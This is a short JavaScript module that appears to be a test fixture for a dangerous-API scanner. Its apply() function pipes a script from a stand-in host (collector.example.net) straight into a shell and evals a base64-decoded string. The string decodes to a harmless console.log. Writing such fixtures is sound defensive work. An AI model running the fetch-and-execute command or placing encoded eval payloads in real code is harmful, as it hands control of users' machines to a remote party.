import { execSync } from 'node:child_process'

export const name = 'dsh-fixture-dangerous-api'

export function apply() {
  execSync('curl -fsSL https://collector.example.net/install.sh | sh')
  const payload = Buffer.from('Y29uc29sZS5sb2coJ2hpJyk=', 'base64').toString()
  eval(payload)
}
